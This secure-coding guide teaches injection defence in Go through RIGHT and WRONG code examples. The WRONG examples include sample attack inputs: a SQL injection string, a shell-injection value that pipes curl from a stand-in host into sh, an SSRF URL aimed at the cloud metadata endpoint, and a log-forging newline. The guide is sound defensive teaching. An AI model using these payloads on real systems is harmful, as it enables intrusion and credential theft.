# Injection defense

*Security · Derived from the global `sec-injection-defense` skill — **binding on this project***

## What it is

Injection happens when data is placed somewhere an **interpreter** reads it, and the
interpreter cannot tell your structure from the attacker's content. **The rule: separate code
from data structurally. Where that is impossible, encode for the exact destination context.**

## Why it exists

Because the instinctive fix — better escaping in a string concatenation — does not work. The
metacharacter set is larger than anyone remembers, it differs per interpreter and per
platform, and "it's escaped" is a claim nobody can verify by reading. Structural separation
removes the question: the interpreter is told which part is structure before it ever sees the
data.

## When to use it

Wherever user-controlled data reaches an interpreter:

| Interpreter | Do | Never |
|---|---|---|
| SQL / NoSQL | Parameterised queries, bound variables | Concatenation, however "escaped" |
| Shell / OS | Direct exec with an argument **array**; no shell | A command string passed to a shell |
| HTML / DOM | Contextual output encoding; safe DOM APIs | `innerHTML` with user data |
| XML | Disable DTDs and external entities | Default parser settings |
| Templates | Pass data as **context**; auto-escaping on | User data in the template *source* |
| File paths | Ids mapped server-side; generated names | Paths built from input |
| Redirects / server fetch | Allowlist of destinations | A user-supplied URL |
| Deserialisation | Data-only formats; schema parsing | Native deserialisation of untrusted bytes |

**If a library offers no parameterised form, that is a strong signal to find a different
library** before writing your own escaping.

## How to use it

```go
// RIGHT — bound parameters. The structure is fixed before the data arrives.
rows, err := db.QueryContext(ctx,
    `SELECT id, effect FROM decisions WHERE repository = $1 AND created_at > $2`,
    repo.String(), since)
```

```go
// RIGHT — an identifier cannot be parameterised, so the user picks a KEY and
// the code chooses the SQL. Their string never reaches the query.
var sortColumns = map[string]string{
    "date":     "created_at",
    "severity": "severity",
}

column, ok := sortColumns[requested]
if !ok {
    return ErrBadSortKey
}
query := fmt.Sprintf(`SELECT id FROM decisions ORDER BY %s DESC`, column)
```

```go
// RIGHT — argument array, direct exec, explicit environment. No shell.
cmd := exec.CommandContext(ctx, "opa", "eval", "-d", bundlePath, query)
cmd.Env = []string{"PATH=/usr/bin", "HOME=/nonexistent"}   // inputs too; set them
```

**The invariant: the defence is structural, and you can name the mechanism.** "It's escaped"
is a finding until you can name the exact function and confirm it matches the destination
context.

## How not to use it

**Concatenating into a query.**

```go
// WRONG — no amount of escaping makes this safe.
query := "SELECT id FROM decisions WHERE repository = '" + repo + "'"
rows, err := db.QueryContext(ctx, query)
// Symptom: repo = "x' OR '1'='1" returns every row. Quoting rules are not a
// defence; the interpreter cannot tell structure from content.
```

**A command string through a shell.**

```go
// WRONG — the shell re-parses everything.
cmd := exec.Command("sh", "-c", "opa eval -d "+bundlePath+" '"+query+"'")
// Symptom: bundlePath = "x; curl evil.example | sh" executes. Do not attempt to
// quote user data into a command line.
```

**Fetching a user-supplied URL — SSRF.**

```go
// WRONG — the server becomes a proxy into its own network.
resp, err := http.Get(req.BundleURL)
// Symptom: BundleURL = "http://169.254.169.254/latest/meta-data/" returns cloud
// credentials. Blocking internal ranges fails to DNS rebinding, redirects,
// alternate IP encodings and IPv6 — allowlist the destinations instead.
```

```go
// RIGHT — allowlist, no redirects, bounded response, timeout.
if !allowedBundleHosts[u.Host] { return ErrHostNotAllowed }
client := &http.Client{
    Timeout:       30 * time.Second,
    CheckRedirect: func(*http.Request, []*http.Request) error { return http.ErrUseLastResponse },
}
```

**Default XML parser settings — XXE.** External entities read local files and reach internal
services. Disable DTDs and entity resolution explicitly; several parsers still enable them by
default.

**Native deserialisation of untrusted bytes.** It instantiates arbitrary types and is remote
code execution. Use data-only formats and parse into a known schema.

**User data in template source.** Templates are code: they come from your repository, never
from a request or a database row. Data goes in the **context**.

**A concatenated log message.**

```go
// WRONG — unescaped newlines let an attacker forge entries.
log.Printf("decision for %s: %s", repo, reason)
// Symptom: reason containing "\n2026-10-13 INFO admin login" forges a log line.
// Log structured fields, never a concatenated message.
```

**Trade-off:** parameterisation is occasionally awkward — dynamic identifiers, `IN` clauses,
bulk inserts — and the allowlist-to-literal mapping is more code than interpolation. There is
no version of this where concatenation becomes acceptable.

**Related:** `input-validation.md`, `error-handling-and-logging.md`, `threat-modeling.md`
